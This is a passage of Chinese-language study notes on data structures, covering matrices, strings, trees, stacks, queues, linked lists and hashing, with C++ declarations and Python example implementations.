特殊矩阵</h3><blockquote><ul><li>压缩矩阵：多同值元素仅分配一个存储空间，零元素不分配空间。</li><li>特殊矩阵：有许多相同元素或零，且分布有一定规律。</li><li>矩阵分区：下三角区，主对角线，上三角区。</li><li>行优先：先存完该行的每一列。</li><li>列优先：先存完该列的每一行。</li></ul></blockquote><ul><li><p>对称矩阵</p><ul><li><p>定义：n 阶矩阵任一元素都 <code>a[i,j] = a[j,i]</code></p><blockquote><p>一般上三角折到下三角。</p></blockquote></li></ul></li><li><p>三角矩阵</p><ul><li>下三角矩阵：上三角区元素均为同一变量（不包括主对角线），则在线性存储时尾部加一个空间存上三角值。</li><li>上三角矩阵：同理。</li></ul></li><li><p>三对角矩阵</p><ul><li>定义：n 阶矩阵任一元素 <code>a[i,j]</code>，当 <code>|i - j| &gt; 1</code> 时有 <code>a[i,j] = 0</code></li><li>通俗：首位两行各两个元素，其他行每行只有三个元素，坐标是<code>j = i-1，j = i，j = i+1</code></li></ul></li><li><p>稀疏矩阵</p><blockquote><p>m <em> n的矩阵中含有t个非零元素，当t / ( m </em> n)  &lt;= 0.5 时称为稀疏矩阵。</p></blockquote><ul><li>存储：数组，十字链表。</li></ul></li></ul><hr><h2 id="三、串"><a href="#三、串" class="headerlink" title="三、串"></a>三、串</h2><h3 id="1-串"><a href="#1-串" class="headerlink" title="1 串"></a>1 串</h3><blockquote><p>存字符的线性表。</p></blockquote><ul><li><p>串</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义</span></span><br><span class="line"><span class="comment">// 静态</span></span><br><span class="line"><span class="keyword">struct</span> &#123;ch[],length&#125;;</span><br><span class="line"><span class="comment">// 动态</span></span><br><span class="line"><span class="keyword">struct</span> &#123;*ch,length&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数</span></span><br><span class="line"><span class="comment">// 赋值，串 T 值改为 chars</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StrAssign</span><span class="params">(String &amp;T,String chars)</span></span>;</span><br><span class="line"><span class="comment">// 复制，串 S 复制给 T</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StrCopy</span><span class="params">(String &amp;T,String S)</span></span>;</span><br><span class="line"><span class="comment">// 判空</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">StrEmpty</span><span class="params">(String S )</span></span>;</span><br><span class="line"><span class="comment">// 比较，len(S) - len(T)</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">StrCompare</span><span class="params">(String S,String T)</span></span>;</span><br><span class="line"><span class="comment">// 串长</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StrLength</span><span class="params">(String S)</span></span>;</span><br><span class="line"><span class="comment">// return Sub = S[pos:pos+len]</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SubString</span><span class="params">( String &amp;Sub,String S,<span class="type">int</span> pos,<span class="type">int</span> len)</span></span>;</span><br><span class="line"><span class="comment">// 拼接</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Concat</span><span class="params">(String &amp;T,String S1,String S2)</span></span>;</span><br><span class="line"><span class="comment">// 找 S 中第一次出现的子串 T 的索引</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Index</span><span class="params">(String S,String T)</span></span>;</span><br><span class="line"><span class="comment">// 清空</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ClearString</span><span class="params">(String &amp;S)</span></span>;</span><br><span class="line"><span class="comment">// 销毁</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DestroyString</span><span class="params">(String &amp;S)</span></span>;</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-KMP算法"><a href="#2-KMP算法" class="headerlink" title="2 KMP算法"></a>2 KMP算法</h3><hr><h2 id="四、树"><a href="#四、树" class="headerlink" title="四、树"></a>四、树</h2><h3 id="1-树"><a href="#1-树" class="headerlink" title="1 树"></a>1 树</h3><blockquote><p>分支关系的非线性结构。</p><p>任何一个非空树是一个二元组。Tree = ( root , F )。</p><ul><li>root：根节点。</li><li>F：子树森林。</li></ul></blockquote><ul><li>基本概念</li></ul><div class="table-container"><table><thead><tr><th>名称</th><th>意义</th></tr></thead><tbody><tr><td>结点</td><td>数据元素 + 若干指向子树的分支</td></tr><tr><td>结点的度</td><td>分支的个数</td></tr><tr><td>树的度</td><td>树中所有结点的度的最大值</td></tr><tr><td>叶子结点</td><td>度等于0的结点</td></tr><tr><td>分支结点</td><td>度大于0的结点</td></tr><tr><td>孩子结点</td><td>下一级</td></tr><tr><td>双亲结点</td><td>上一级</td></tr><tr><td>兄弟结点</td><td>同级</td></tr><tr><td>祖先结点</td><td>上级</td></tr><tr><td>子孙结点</td><td>下级</td></tr><tr><td>层次</td><td>树的层数</td></tr><tr><td>深度</td><td>最大层次</td></tr><tr><td>森林</td><td>多个互不相交的树的集合</td></tr></tbody></table></div><ul><li>树</li></ul><h3 id="2-二叉树"><a href="#2-二叉树" class="headerlink" title="2 二叉树"></a>2 二叉树</h3><blockquote><p>每个结点至多只有两颗子树，且子树有左右之分的树。</p></blockquote><ul><li><p>基本概念</p><ul><li><p>二叉树的五种状态</p><ol><li>空</li><li>只有跟结点</li><li>有根结点和左子树</li><li>有根结点和右子树</li><li>有跟结点和左右子树</li></ol></li><li><p>二叉树性质</p><ol><li>在二叉树的第 i 层至多有 2 ^ ( i - 1 )个结点( i &gt;= 1)。</li><li>深度为 k 的二叉树上至多有 2 ^ k - 1个结点( k &gt;= 1)。</li><li>任何一颗二叉树，他含有n0个叶子结点，n2个度为2的结点，则必然有n0 = n2 + 1。</li></ol></li><li><p>满二叉树</p><blockquote><p>深度为 k 且含有 2 ^ k - 1 个结点的二叉树。</p></blockquote></li><li><p>完全二叉树</p><blockquote><p>树中所含的 n 个结点和满二叉树中编号为 1至n 的结点一一对应。（从左到右从上到下编号，不一定是满二叉树）</p></blockquote></li><li><p>完全二叉树性质（123如上）：</p><ol><li>具有 n 个结点的完全二叉树的深度为   ⌊log2 n⌋+ 1 。 （⌊⌋ 向下取整）</li><li>⌊2i⌋ 为根节点 ，i 的左孩子是 2i ， 右孩子是 2i + 1。所以若 2i / 2i + 1 &gt; n 则该结点无左孩子/右孩子。</li></ol></li></ul></li><li><p>二叉树</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">BiTNode</span>    <span class="comment">//二叉链表</span></span><br><span class="line">&#123;</span><br><span class="line">        TElemType data;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">BiTNode</span>* lchild, * rchild;  <span class="comment">//左右孩子</span></span><br><span class="line">&#125;BiTNode, * BiTree;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">TriTNode</span>    <span class="comment">//三叉链表</span></span><br><span class="line">&#123;</span><br><span class="line">        TElemType data;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">TriTNode</span>* lchild, * rchild;  <span class="comment">//左右孩子</span></span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">TriTNode</span>* parent;  <span class="comment">//双亲结点</span></span><br><span class="line">&#125;TriTNode, * TriTree;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">BPTNode</span>   <span class="comment">//双亲链表</span></span><br><span class="line">&#123;</span><br><span class="line">        TElemType data;</span><br><span class="line">        <span class="type">int</span>* parent;  <span class="comment">//双亲结点</span></span><br><span class="line">        <span class="type">char</span> LRTag;  <span class="comment">//标志自己是左孩子还是右孩子</span></span><br><span class="line">&#125;BPTNode;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">BPTree</span></span><br><span class="line">&#123;</span><br><span class="line">        BPTNode nodes[MAX_TREE_SIZE];</span><br><span class="line">        <span class="type">int</span> num_node;  <span class="comment">//结点数目</span></span><br><span class="line">        <span class="type">int</span> root;  <span class="comment">//根节点</span></span><br><span class="line">&#125;BPTree;</span><br><span class="line"></span><br><span class="line">SqBiTree[MAX_TREE_SIZE];    <span class="comment">//顺序存储（按编号，常用于完全二叉树）</span></span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="五、图"><a href="#五、图" class="headerlink" title="五、图"></a>五、图</h2><ul><li><p>图</p><ul><li><p>基本概念</p></li><li><p>树</p></li></ul></li></ul><hr><h2 id="六、查找"><a href="#六、查找" class="headerlink" title="六、查找"></a>六、查找</h2><hr><h2 id="七、排序"><a href="#七、排序" class="headerlink" title="七、排序"></a>七、排序</h2><hr><h2 id="八、案例"><a href="#八、案例" class="headerlink" title="八、案例"></a>八、案例</h2><h3 id="1-日期之差"><a href="#1-日期之差" class="headerlink" title="1 日期之差"></a>1 日期之差</h3><blockquote><p><a href="https://blog.csdn.net/weixin_58045538/article/details/128903716">author::日期之差</a></p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 计算从 0001-1-1 起的天数</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">countdays</span><span class="params">(<span class="type">int</span> y, <span class="type">int</span> m, <span class="type">int</span> d)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (m &lt; <span class="number">3</span>)    y--, m += <span class="number">12</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">365</span> * y + (y &gt;&gt; <span class="number">2</span>) - y / <span class="number">100</span> + y / <span class="number">400</span> + (<span class="number">153</span> * m - <span class="number">457</span>) / <span class="number">5</span> + d - <span class="number">306</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="Python数据结构"><a href="#Python数据结构" class="headerlink" title="Python数据结构"></a>Python数据结构</h1><blockquote><p> <a href=".\a378bd8e">text::Python</a></p><p><a href=".\ea53bcd3">text::Python蓝桥杯题集</a> </p></blockquote><hr><h2 id="一、引论"><a href="#一、引论" class="headerlink" title="一、引论"></a>一、引论</h2><ul><li><p>图灵机</p><blockquote><p>左半全a右半全b判断是否满足要求。</p><p>例子：aaaabbbb，从头开始，先擦除头a，再右移到尾，擦除尾b，再左移到a，擦除头a，循环，直到全被擦除返回真，否则返回假。</p></blockquote></li><li><p>数据类型的性能<img src="/posts/4b0178e0/listO.jpg" alt="img"><img src="/posts/4b0178e0/dictO.jpg" alt="img"></p><ul><li><p>列表</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># O(1)</span></span><br><span class="line">x = lst[i]</span><br><span class="line">lst[i] = x</span><br><span class="line"><span class="comment"># O(1)</span></span><br><span class="line">lst.append(x)：</span><br><span class="line"><span class="comment"># O(n + k)(k是被加列表长度)</span></span><br><span class="line">lst = lst + new_lst</span><br></pre></td></tr></table></figure></li></ul></li><li><p>外部库数据结构</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install pythonds3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 二叉堆</span></span><br><span class="line"><span class="keyword">from</span> pythonds3.trees.binary_heap <span class="keyword">import</span> BinaryHeap</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="二、栈"><a href="#二、栈" class="headerlink" title="二、栈"></a>二、栈</h2><h3 id="1-栈实现"><a href="#1-栈实现" class="headerlink" title="1 栈实现"></a>1 栈实现</h3><blockquote><p>list末端是栈顶，首端是栈底。底不会变，变的是顶的位置。（时间复杂度较低）</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Stack</span>:</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.__stack = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">push</span>(<span class="params">self,item:<span class="built_in">any</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">        self.__stack.append(item)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pop</span>(<span class="params">self</span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">return</span> self.__stack.pop()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">peek</span>(<span class="params">self</span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">return</span> self.__stack[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isEmpty</span>(<span class="params">self</span>)-&gt;<span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">return</span> self.__stack == []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">size</span>(<span class="params">self</span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(self.__stack)</span><br></pre></td></tr></table></figure><h3 id="2-表达式求值"><a href="#2-表达式求值" class="headerlink" title="2 表达式求值"></a>2 表达式求值</h3><hr><h2 id="三、队列"><a href="#三、队列" class="headerlink" title="三、队列"></a>三、队列</h2><h3 id="1-队列实现"><a href="#1-队列实现" class="headerlink" title="1 队列实现"></a>1 队列实现</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># list首端队首，末端队尾</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Queue</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.__queue = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enqueue</span>(<span class="params">self,item:<span class="built_in">any</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">        self.__queue.append(item)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dequeue</span>(<span class="params">self</span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">return</span> self.__queue.pop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isEmpty</span>(<span class="params">self</span>)-&gt;<span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">return</span> self.__queue == []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">size</span>(<span class="params">self</span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(self.__queue)</span><br><span class="line"><span class="comment"># 其中enqueue为 O(1)，dequeue为O(n)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># list首端队尾，末端队首</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Queue</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.__queue = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enqueue</span>(<span class="params">self,item:<span class="built_in">any</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">        self.__queue.insert(<span class="number">0</span>,item)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dequeue</span>(<span class="params">self</span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">return</span> self.__queue.pop()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isEmpty</span>(<span class="params">self</span>)-&gt;<span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">return</span> self.__queue == []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">size</span>(<span class="params">self</span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(self.__queue)</span><br><span class="line"><span class="comment"># 其中enqueue为O(n)，dequeue为O(1)</span></span><br></pre></td></tr></table></figure><h3 id="2-双端队列实现"><a href="#2-双端队列实现" class="headerlink" title="2 双端队列实现"></a>2 双端队列实现</h3><blockquote><p>如果端相反，则操作和时间复杂度都相反。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># list首端队首，末端队尾</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Deque</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.__deque = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">addFront</span>(<span class="params">self,item:<span class="built_in">any</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">        self.__deque.insert(<span class="number">0</span>,item)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">addRear</span>(<span class="params">self,item:<span class="built_in">any</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">        self.__deque.append(item)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">removeFront</span>(<span class="params">self</span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">return</span> self.__deque.pop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">removeRear</span>(<span class="params">self</span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">return</span> self.__deque.pop()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isEmpty</span>(<span class="params">self</span>)-&gt;<span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">return</span> self.__deque == []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">size</span>(<span class="params">self</span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(self.__deque)</span><br><span class="line"><span class="comment"># 其中addFront/removeFront为O(n)，addRear/removeRear为O(1)</span></span><br></pre></td></tr></table></figure><hr><h2 id="四、链表"><a href="#四、链表" class="headerlink" title="四、链表"></a>四、链表</h2><h3 id="1-普通无序链表"><a href="#1-普通无序链表" class="headerlink" title="1 普通无序链表"></a>1 普通无序链表</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,intidata:<span class="built_in">any</span></span>):</span><br><span class="line">        self.__data = intidata</span><br><span class="line">        self.__<span class="built_in">next</span> = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getData</span>(<span class="params">self</span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">return</span> self.__data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getNext</span>(<span class="params">self</span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">return</span> self.__<span class="built_in">next</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setData</span>(<span class="params">self,newdata:<span class="built_in">any</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">        self.__data = newdata</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setNext</span>(<span class="params">self,newnext:<span class="built_in">any</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">        self.__<span class="built_in">next</span> = newnext</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HeadNode</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.__<span class="built_in">next</span> = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getNext</span>(<span class="params">self</span>)-&gt;Node:</span><br><span class="line">        <span class="keyword">return</span> self.__<span class="built_in">next</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setNext</span>(<span class="params">self,newnext:<span class="built_in">any</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">        self.__<span class="built_in">next</span> = newnext</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">insert</span>(<span class="params">self,item:<span class="built_in">any</span>,location:<span class="built_in">int</span>=<span class="number">1</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">        new = Node(item)</span><br><span class="line">        <span class="keyword">if</span> location == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> self.getNext() != <span class="literal">None</span>:</span><br><span class="line">                new.setNext(self.getNext())</span><br><span class="line">                self.setNext(new)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.setNext(new)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            n = self.getNext()</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,location - <span class="number">1</span>):</span><br><span class="line">                n = n.getNext()</span><br><span class="line">            new.setNext(n.getNext())</span><br><span class="line">            n.setNext(new)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">peek</span>(<span class="params">self</span>)-&gt;<span class="built_in">list</span>:</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">if</span> self.getNext() != <span class="literal">None</span>:</span><br><span class="line">            n = self.getNext()</span><br><span class="line">            <span class="keyword">while</span> n.getNext() != <span class="literal">None</span>:</span><br><span class="line">                res.append(n.getData())</span><br><span class="line">                n = n.getNext()</span><br><span class="line">            res.append(n.getData())</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">count</span>(<span class="params">self</span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        n = self.getNext()</span><br><span class="line">        <span class="keyword">if</span> n != <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">while</span> n != <span class="literal">None</span>:</span><br><span class="line">                res += <span class="number">1</span></span><br><span class="line">                n = n.getNext()</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">self,location:<span class="built_in">int</span></span>)-&gt;Node:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">self,item:<span class="built_in">any</span></span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="2-有序表"><a href="#2-有序表" class="headerlink" title="2 有序表"></a>2 有序表</h3><blockquote><p>定义：按大小顺序排好的链表。</p></blockquote><hr><h2 id="五、散列"><a href="#五、散列" class="headerlink" title="五、散列"></a>五、散列</h2><h3 id="1-哈希表"><a href="#1-哈希表" class="headerlink" title="1 哈希表"></a>1 哈希表</h3><blockquote><p>事先确定了数据的位置，查找的时间为：O(1)</p><p>def hash( num )：计算哈希值。（一般是求余）</p><p>hash_lst对应余数值，查找时计算余数值后在 hash_lst 中寻找是否有该数值。</p></blockquote><ul><li><p>完美散列函数</p><blockquote><p>每一个数据项都映射到不同的槽中。</p></blockquote></li><li><p>好的散列函数</p><ul><li>冲突少（近似完美）</li><li>计算难度低（额外开销小）</li><li>充分分散数据项（节约空间）</li></ul></li><li><p>作为一致性校验的数据“指纹”函数需要具备如下的特性</p><ul><li>压缩性：任意长度的数据，得到的“指纹”长度是固定的。</li><li>易计算性：从原数据计算“指纹”很容易。（从指纹计算原数据是不可能的）</li><li>抗修改性：对原数据的微小变动，都会引起“指纹”的大改变。</li><li>抗冲突性：已知原数据和“指纹”，要找到相同指纹的数据（伪造）是非常困难的。</li></ul></li><li><p>案例：md5（128位），SHA-0/SHA-1（160位（20 Bytes）），SHA-256，SHA-224，SHA-512，SHA-384</p></li><li>应用：密码，网盘（先上传散列值，比较服务器中有无该资源，有则存链接，无则上传文件）</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python中自带的加密</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">m = hashlib.md5()</span><br><span class="line">m.update(<span class="string">&quot;password&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)) <span class="comment"># 更新m中的字符串</span></span><br><span class="line">pw = m.hexdigest()</span><br><span class="line"><span class="built_in">print</span>(pw)</span><br><span class="line"><span class="built_in">print</span>(hashlib.md5((<span class="string">&quot;Hello World!&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))).hexdigest())</span><br></pre></td></tr></table></figure><h3 id="2-折叠法"><a href="#2-折叠法" class="headerlink" title="2 折叠法"></a>2 折叠法</h3><blockquote><p>将数据项按照位数分为若干段，再将几段数字相加，最后对散列表大小求余。</p><p>隔数反转：隔一个数将数字进行反转。（属于一种微调手段，以便更好符合散列特效）</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&quot;12312311231&quot;</span></span><br><span class="line">h = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s))]</span><br><span class="line">gap = <span class="number">2</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s),gap):</span><br><span class="line">    i = <span class="built_in">int</span>(s[i:i+gap-<span class="number">1</span>])</span><br><span class="line">    count += i</span><br><span class="line">h[count % <span class="built_in">len</span>(s)] = s</span><br><span class="line"><span class="built_in">print</span>(h)</span><br></pre></td></tr></table></figure><h3 id="3-平方取中法"><a href="#3-平方取中法" class="headerlink" title="3 平方取中法"></a>3 平方取中法</h3><blockquote><p>先对数进行平方，再取平方数中间两位，最后对散列表大小求余。</p></blockquote><h3 id="4-设计注意"><a href="#4-设计注意" class="headerlink" title="4 设计注意"></a>4 设计注意</h3><blockquote><p>变位词：字母一样，顺序不同。为了防止可以将字符所在位置设为权重相乘。</p></blockquote><h3 id="5-冲突解决"><a href="#5-冲突解决" class="headerlink" title="5 冲突解决"></a>5 冲突解决</h3><ol><li><p>开放定址（open addressing）</p><blockquote><p>在冲突的数据项处重新再逐个向后找一个空槽。该方法叫线性探测（linear probing）。</p></blockquote><ul><li>缺点：有聚集的趋势。</li><li>改进：逐个向后找改为跳跃式探测，例如一次+3。（尽量将散列表大小设为素数，防止周期）</li><li>改进：不再固定为一个值，而是逐步增加，例：+1 , +3 , +5 , +7 …</li></ul></li><li><p>数据项链（Chaining）</p><blockquote><p>将槽扩展为数据项集合。（散列 + 排序查找）</p></blockquote></li></ol><h3 id="6-ADT-Map"><a href="#6-ADT-Map" class="headerlink" title="6 ADT Map"></a>6 ADT Map</h3><blockquote><p>dict：映射Map。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">HashTable</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,size:<span class="built_in">int</span></span>):</span><br><span class="line">        self.size = size</span><br><span class="line">        self.slots = [<span class="literal">None</span>] * self.size <span class="comment"># 保存key</span></span><br><span class="line">        self.data = [<span class="literal">None</span>] * self.size <span class="comment"># 保存data</span></span><br><span class="line">    <span class="comment"># hash函数</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hashfunction</span>(<span class="params">self,key:<span class="built_in">any</span></span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">return</span> key % self.size</span><br><span class="line">    <span class="comment"># 再hash函数</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rehash</span>(<span class="params">self,oldhash:<span class="built_in">int</span></span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">return</span> (oldhash + <span class="number">1</span>) % self.size</span><br><span class="line">    <span class="comment"># 存key-val</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">put</span>(<span class="params">self,key:<span class="built_in">any</span>,data:<span class="built_in">any</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">        hashvalue = self.hashfunction(key)</span><br><span class="line">        <span class="keyword">if</span> self.slots[hashvalue] == <span class="literal">None</span>:</span><br><span class="line">            self.slots[hashvalue] = key</span><br><span class="line">            self.data[hashvalue] = data</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> self.slots[hashvalue] == key:</span><br><span class="line">                self.data[hashvalue] = data</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                nextslot = self.rehash(hashvalue)</span><br><span class="line">                <span class="keyword">while</span> self.slots[nextslot] != <span class="literal">None</span> <span class="keyword">and</span> self.slots[nextslot] != key:</span><br><span class="line">                    nextslot = self.rehash(nextslot)</span><br><span class="line">                <span class="keyword">if</span> self.slots[nextslot] == <span class="literal">None</span>:</span><br><span class="line">                    self.slots[nextslot] = key</span><br><span class="line">                    self.data[nextslot] = data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.data[nextslot] = data</span><br><span class="line">    <span class="comment"># key获得data</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self,key:<span class="built_in">any</span></span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        startslot = self.hashfunction(key)</span><br><span class="line">        data = <span class="literal">None</span></span><br><span class="line">        stop = <span class="literal">False</span></span><br><span class="line">        found = <span class="literal">False</span></span><br><span class="line">        position = startslot</span><br><span class="line">        <span class="keyword">while</span> self.slots[position] != <span class="literal">None</span> <span class="keyword">and</span> <span class="keyword">not</span> found <span class="keyword">and</span> <span class="keyword">not</span> stop:</span><br><span class="line">            <span class="keyword">if</span> self.slots[position] == key:</span><br><span class="line">                found = <span class="literal">True</span></span><br><span class="line">                data = 